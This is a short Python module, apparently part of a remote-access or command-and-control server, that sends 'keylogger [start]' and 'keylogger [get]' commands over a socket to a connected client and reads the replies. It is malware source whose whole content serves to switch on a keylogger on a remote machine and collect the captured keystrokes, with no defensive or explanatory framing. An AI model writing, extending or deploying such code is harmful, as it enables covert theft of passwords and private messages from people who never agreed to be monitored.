import socket
from . import comm, config


def call_keylogger_start(client: socket.socket):
    comm.send(client, f"keylogger [start]", config.SERVER_VERBOSE)
    comm.receive(client, config.SERVER_VERBOSE)


def call_keylogger_get(client: socket.socket):
    comm.send(client, f"keylogger [get]", config.SERVER_VERBOSE)
    comm.receive(client, config.SERVER_VERBOSE)
